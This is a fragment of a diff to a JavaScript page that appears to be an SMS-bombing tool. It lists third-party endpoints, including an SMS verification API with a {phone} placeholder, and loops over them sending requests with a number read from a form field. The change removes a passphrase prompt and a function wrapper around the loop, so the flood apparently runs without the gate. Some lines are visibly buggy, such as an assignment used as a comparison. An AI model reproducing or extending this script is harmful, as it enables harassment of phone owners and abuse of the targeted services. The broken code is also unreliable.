@@ -286,16 +286,16 @@
 "POST","https://www.sensorsdata.cn/api/passport/sms/quest_new/{phone}?_t=qajgslud4i",
 "POST","https://z12.cnzz.com/stat.htm","id=12800"];
 
-        var person = prompt("请输入暗号～", "");
 
-        function fire() {
+
+        
             var name = document.getElementById("last_name").value;
 
 
         
 
 
-            if (person == "") {
+
                 for (var i = 0; i < jiekou.length; i++) {
                     if(jiekou[i]="GET"){
                     i=1+1
@@ -313,6 +313,6 @@ httpRequest.send(jkc);
                     
                     }
                 }
-            }
+            
 
-        }
+        
